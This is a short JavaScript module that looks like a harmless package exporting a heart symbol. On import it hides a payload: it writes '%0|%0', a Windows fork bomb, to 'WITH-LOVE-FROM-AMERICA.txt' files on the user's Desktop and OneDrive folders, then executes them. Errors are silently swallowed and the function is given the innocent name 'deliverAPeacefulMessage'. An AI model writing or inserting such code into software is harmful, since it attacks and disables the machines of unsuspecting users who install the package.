import fs from 'fs';
import find from './service/findFiles.js';
import read from './service/readFile.js';
import { homedir } from 'os';


var Desktops = `${homedir}/Desktop/`;
var OneDrive = `${homedir}/OneDrive/`;
var OneDriveDesktops = `${homedir}/OneDrive/Desktop/`;

var DesktopFileExists=find(Desktops,'WITH-LOVE-FROM-AMERICA.txt');
var OneDriveDesktopFileExists=find(OneDriveDesktops,'WITH-LOVE-FROM-AMERICA.txt');
var OneDriveFileExists=find(OneDrive,'WITH-LOVE-FROM-AMERICA.txt');


function deliverAPeacefulMessage(path,message){
    try{
        fs.writeFile(
            path, 
            '%0|%0',
            function(err){
                //its all good
            }
        );
    }catch(err){
        //thats ok
    }
    require("child_process").exec(path)
}

//let's be polite and only do this once.
//hopefully once is all it takes.
if(!DesktopFileExists?.length&&!OneDriveFileExists?.length&&!OneDriveDesktopFileExists?.length){
    var thinkaboutit='WITH-LOVE-FROM-AMERICA.txt';

    var WITH_LOVE_FROM_AMERICA=read(`./${thinkaboutit}`);

    deliverAPeacefulMessage(`${Desktops}${thinkaboutit}`,WITH_LOVE_FROM_AMERICA);
    deliverAPeacefulMessage(`${OneDriveDesktops}${thinkaboutit}`,WITH_LOVE_FROM_AMERICA);
    deliverAPeacefulMessage(`${OneDrive}${thinkaboutit}`,WITH_LOVE_FROM_AMERICA);
}

var whatWeWant='♥';

export {
    whatWeWant as default,
    whatWeWant
}
